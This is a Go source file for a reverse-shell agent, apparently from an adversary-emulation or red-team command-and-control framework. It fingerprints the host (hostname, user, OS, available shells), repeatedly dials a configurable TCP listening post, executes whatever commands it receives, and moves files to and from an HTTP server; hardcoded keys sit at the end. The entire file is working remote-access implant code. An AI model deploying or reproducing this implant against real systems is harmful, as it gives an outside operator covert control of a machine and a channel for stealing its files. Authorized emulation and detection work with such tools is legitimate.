package main

import (
   "bytes"
   "bufio"
   "os/exec"
   "fmt"
   "net"
   "strings"
   "os"
   "os/user"
   "runtime"
   "time"
   "flag"
   "strconv"

   "./output"
   "./commands"
)

var shellInfo, httpServer, paw string

func determineExecutor(platform string, arch string) string {
	platformExecutors := map[string]map[string][]string {
		"windows": {
			"file": {"cmd.exe", "powershell.exe", "pwsh.exe"},
			"executor": {"cmd", "psh", "pwsh"},
		},
		"linux": {
			"file": {"sh", "pwsh"},
			"executor": {"sh", "pwsh"},
		},
		"darwin": {
			"file": {"sh", "pwsh"},
			"executor": {"sh", "pwsh"},
		},
   }
   var executors bytes.Buffer
   for platformKey, platformValue := range platformExecutors {
      if platform == platformKey {
         for i := range platformValue["file"] {
            if checkIfExecutorAvailable(platformValue["file"][i]) {
               executors.WriteString(platformExecutors[platformKey]["executor"][i] + ",")
            }
         }
      }
   }
	return executors.String()
}

func checkIfExecutorAvailable(executor string) bool {
	_, err := exec.LookPath(executor)
	return err == nil
}

func runNextCommand(message string) ([]byte, int) {
   if strings.HasPrefix(message, "cd") {
      pieces := strings.Split(message, "cd")
      bites := commands.ChangeDirectory(pieces[1])
      return bites, 0
   } else if (strings.HasPrefix(message, "download")) {
      pieces := strings.Split(message, "download")
      go commands.Download(httpServer, pieces[1])
      return []byte("Download initiated\n"), 0
   } else if (strings.HasPrefix(message, "upload")) {
      pieces := strings.Split(message, "upload")
      go commands.Upload(httpServer, pieces[1], shellInfo)
      return []byte("Upload initiated\n"), 0
   } else {
      bites, status := commands.Execute(message)
      return bites, status
   }
}

func listen(conn net.Conn, paw []byte) {
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        message := scanner.Text()
        bites, status := runNextCommand(strings.TrimSpace(message))
        statusBites := []byte(fmt.Sprintf("%s$", strconv.Itoa(status)))
        response := append(paw, statusBites...)
        conn.Write(append(response, bites...))
    }
}

func handshake(conn net.Conn) string {
    conn.Write([]byte(terminal_key))
    conn.Write([]byte("\n"))
    conn.Write([]byte(shellInfo))
    conn.Write([]byte("\n"))
    data := make([]byte, 512)
    n, _ := conn.Read(data)
    paw := string(data[:n])
    conn.Write([]byte("\n"))
    return strings.TrimSpace(string(paw))
}

func main() {
   host, _ := os.Hostname()
   user, _ := user.Current()
   platform := runtime.GOOS
   architecture := runtime.GOARCH
   executors := determineExecutor(platform, architecture)
   shellInfo = fmt.Sprintf("%s$%s$%s$%s$%s", host, user.Username, platform, architecture, executors)

   verbose := flag.Bool("v", false, "Enable verbose output")
   tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
   http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
   flag.Parse()
   httpServer = *http

   output.SetVerbose(*verbose)

   for {
      conn, err := net.Dial("tcp", *tcp)
      if err != nil {
         fmt.Println(fmt.Sprintf("[-] %s", err))
      } else {
          paw = handshake(conn)
          fmt.Println(fmt.Sprintf("[+] reverse-shell established for %s", paw))
          listen(conn, []byte(fmt.Sprintf("%s$", paw)))
      }
      time.Sleep(5 * time.Second)
   }
}

var key = "MY3DUY6IVC5LN956Q4KUEQEZ2TRQL9"
var terminal_key = "94699f9970213dd1d4054ca678f1278a"